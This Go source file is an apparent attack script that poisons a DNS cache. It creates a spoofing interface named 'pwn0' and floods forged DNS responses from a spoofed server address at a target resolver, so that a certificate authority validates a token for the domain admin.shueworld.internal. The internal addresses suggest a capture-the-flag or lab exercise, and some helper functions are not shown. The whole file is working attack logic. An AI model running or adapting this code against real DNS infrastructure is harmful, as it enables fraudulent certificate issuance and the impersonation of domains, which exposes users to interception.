package main

import (
	"flag"
	"log"
	"math/rand"
	"net"
	"time"
)

var (
	domain = flag.String("d", "admin.shueworld.internal", "Domain to obtain certificate for")
	target = flag.String("t", "10.64.10.3:50000", "Target IP to send packets to")
	server = flag.String("s", "10.64.10.2:53", "Server IP to spoof packets from")
)

func main() {
	flag.Parse()

	log.Println("Preparing DNS poisoner")
	targetAddr, err := net.ResolveUDPAddr("udp", *target)
	if err != nil {
		log.Fatal(err)
	}
	serverAddr, err := net.ResolveUDPAddr("udp", *server)
	if err != nil {
		log.Fatal(err)
	}

	log.Printf("Creating pwn0 interface with %s", serverAddr.IP)
	if err := createDummyIface(serverAddr.IP.String()); err != nil {
		log.Fatal(err)
	}

	u, err := net.ListenUDP("udp", serverAddr)
	if err != nil {
		log.Fatal(err)
	}

	// TODO: Sync local RNG with CA

	// Fetch validation token
	log.Println("Serializing DNS packet")
	pkt, err := dnsPacket(token(*domain), uint16(rand.Intn(65535)))
	if err != nil {
		log.Fatal(err)
	}

	// Write the packets on the wire
	log.Printf("Sending DNS responses to %s", targetAddr)
	txCancel := make(chan bool)
	go func() {
		for {
			select {
			case <-txCancel:
				log.Println("Stopped DNS poisoner")
				return
			default:
				_, err = u.WriteTo(pkt, targetAddr)
				if err != nil {
					log.Fatal(err)
				}
				time.Sleep(200 * time.Nanosecond)
			}
		}
	}()

	log.Println("Waiting for DNS cache poisoning")
	time.Sleep(1 * time.Second)

	// Validate token with CA
	log.Println("Validating token with CA")
	validate(*domain)

	// Stop the DNS poisoner and teardown spoofing interface
	txCancel <- true
	if err := teardownIface(); err != nil {
		log.Fatal(err)
	}
}
